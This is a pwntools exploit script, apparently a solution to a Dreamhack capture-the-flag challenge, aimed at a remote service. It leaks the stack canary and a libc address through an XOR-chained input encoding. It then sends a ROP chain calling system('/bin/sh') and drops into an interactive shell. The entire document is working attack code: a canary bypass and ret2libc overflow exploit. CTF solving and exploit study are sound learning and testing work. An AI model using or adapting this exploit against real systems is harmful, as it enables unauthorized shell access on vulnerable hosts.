from pwn import *

HOST, PORT = '0.0.0.0', 31337
HOST, PORT = 'host3.dreamhack.games', 9996
r = remote(HOST, PORT)

def xored(payload):
    tmp = bytearray(payload)
    for i in range(len(tmp)-1, 0,-1):
        tmp[i-1]^=tmp[i]
    return tmp

r.sendafter(b'Input: ', b'A '*4*3+b'B')
r.recvuntil(b'B')
canary=u64(r.recvline()[:7].ljust(8,b'\x00')) << 8

payload = xored(b'A'*40)
r.sendafter(b'Input: ', payload)

r.recvuntil(b': ')
r.recv(40)
libc=u64(r.recvline().strip().ljust(8,b'\x00'))-0x29d90

pop_rdi=libc+0x2a3e5
binsh=libc+0x1d8698
system=libc+0x50d60
ret=libc+0x29cd6

payload = xored(b'A'*24 + p64(canary) + p64(0) + p64(ret) + p64(pop_rdi) + p64(binsh) + p64(system))
r.sendafter(b'Input: ', payload)

r.sendafter(b'Input: ', xored(b'exit\x00'))

r.interactive()